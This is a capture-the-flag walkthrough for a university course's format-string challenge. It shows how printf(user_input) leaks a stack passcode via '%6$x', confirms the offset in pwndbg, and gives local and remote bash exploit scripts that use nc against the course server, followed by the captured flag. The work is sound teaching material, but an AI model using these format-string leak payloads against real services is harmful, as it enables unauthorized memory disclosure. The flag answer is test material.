# formatstring1 Walkthrough (pwndbg)

This walkthrough shows exactly how to find and use the bug to print the flag.

## 1) Inspect the source and identify the bug

Open:
- `random-game.c`

Key code path:
```c
fgets(buf, size, stdin);
printf(buf);
```

Why this is vulnerable:
- `printf(buf)` treats your input as a format string.
- That means `%x`, `%p`, `%n`, etc. are interpreted by `printf`.
- You can read stack values directly (format string leak).

Goal:
- Leak `passcode` from stack.
- Send it back in the second prompt (`scanf("%x", &yourcode)`).

## 2) Confirm variable layout from disassembly (optional but useful)

Run:
```bash
objdump -d random-game | grep -n "<main>" -A120
```

Important lines in `main`:
- `mov %eax,-0x18(%ebp)` stores `passcode`
- `pushl -0x14(%ebp)` then `call _IO_printf` is `printf(buf)`
- `lea -0x1c(%ebp),%eax` is `yourcode`
- `cmp %eax,-0x18(%ebp)` compares `yourcode` and `passcode`

Meaning:
- `passcode` is a local stack variable at `ebp-0x18`.
- During `printf(buf)`, stack arguments are read from nearby stack slots.

## 3) Use pwndbg to prove the correct stack offset

### 3.1 Break after the second input is read

This lets us compare:
- what `%6$x` printed, and
- the real `passcode` in memory.

Create a small input file:
```bash
printf '%%6$x\n0\n' > in.txt
```

Run gdb/pwndbg:
```bash
gdb -q ./random-game
```

In pwndbg:
```gdb
b *0x08049b81
run < in.txt
p/x *(int*)($ebp-0x18)
```

What you should see:
- Program output prints one hex value after first prompt (from `%6$x`).
- `p/x *(int*)($ebp-0x18)` prints the same hex value.

So `%6$x` is leaking `passcode`.

Clean up:
```bash
rm -f in.txt
```

## 4) Exploit manually

Run the binary normally:
```bash
./random-game
```

At first prompt enter:
```text
%6$x
```

Program prints something like:
```text
221d13a7
```

At second prompt enter that exact hex value:
```text
221d13a7
```

If correct, program follows success branch and executes:
```c
system("cat flag.answer");
```

## 5) Why offset 6 works (quick intuition)

At the vulnerable call site, only one argument is actually passed (`buf`), but format specifiers ask `printf` for more arguments anyway.

On 32-bit x86, those extra reads come from stack words in the caller frame.
The sixth word aligns with local `passcode` (`ebp-0x18`) in this binary.

## 6) Quick checklist

- Find unsafe `printf(user_input)`.
- Confirm passcode is a stack local.
- Find stack index that leaks it (`%6$x`).
- Reuse leaked value at second prompt.
- Get flag from success branch.

## 7) Common mistakes

- Using too long payload: first input buffer is only 16 bytes.
- Typing decimal instead of hex at second prompt.
- Including extra spaces/newlines when copying the leak.
- Assuming same offset on every binary (offset is per-build).

## 8) Optional: one-command local test

This runs the whole attack automatically (leak then reuse):

```bash
bash -lc '
coproc P { ./random-game; }
while IFS= read -r line <&"${P[0]}"; do
	[[ "$line" == *"passcode to enter here?"* ]] && break
done
printf "%%6\$x\n" >&"${P[1]}"
IFS= read -r leak <&"${P[0]}"
while IFS= read -r line <&"${P[0]}"; do
	[[ "$line" == *"Again!"* ]] && break
done
printf "%s\n" "$leak" >&"${P[1]}"
cat <&"${P[0]}"
'
```

If `flag.answer` is present, the binary will print it in the success path.

## 9) Remote solve (moa6.eecs.utk.edu:32100)

Target:
- Host: `moa6.eecs.utk.edu`
- Port: `32100`

### 9.1 One-command remote exploit

Run from this folder:

```bash
bash -lc '
set -euo pipefail
coproc P { nc moa6.eecs.utk.edu 32100; }

# Wait for first prompt
while IFS= read -r line <&"${P[0]}"; do
	echo "$line"
	[[ "$line" == *"passcode to enter here?"* ]] && break
done

# Leak passcode from stack
printf "%%6\$x\n" >&"${P[1]}"
IFS= read -r leak <&"${P[0]}"
echo "$leak"

# Wait for second prompt
while IFS= read -r line <&"${P[0]}"; do
	echo "$line"
	[[ "$line" == *"Again!"* ]] && break
done

# Send leaked passcode back
printf "%s\n" "$leak" >&"${P[1]}"
cat <&"${P[0]}"
'
```

### 9.2 Verified successful output

Observed on run:

```text
------------------------------------------
>> What's the passcode to enter here?
2cfa35f0
>> Again! What's the passcode to enter here?
>> Oh. You got the passcode to enter here. Flag is 
cosc466-flag-{z4-TXkh#wu&7E4vN}
```

Note:
- `^C` can appear after success when the socket session is manually interrupted.
- That does not indicate exploit failure.

## 10) Python script version (commented)

File:
- `exploit_remote.py`

Run:
```bash
/home/jbenjam7/.pyenv/versions/3.11.0/bin/python exploit_remote.py
```

What to read in the script:
- `HOST` and `PORT`: target details.
- `LEAK_PAYLOAD = b"%6$x\\n"`: format-string leak payload.
- `recv_until(...)`: helper that waits for exact challenge prompts.
- `main()`:
	- connects to remote service,
	- waits for first prompt,
	- sends leak payload,
	- parses leaked passcode,
	- sends it back at second prompt,
	- prints remaining output (flag).

Verified result from script run:
```text
>> Oh. You got the passcode to enter here. Flag is 
cosc466-flag-{z4-TXkh#wu&7E4vN}
```
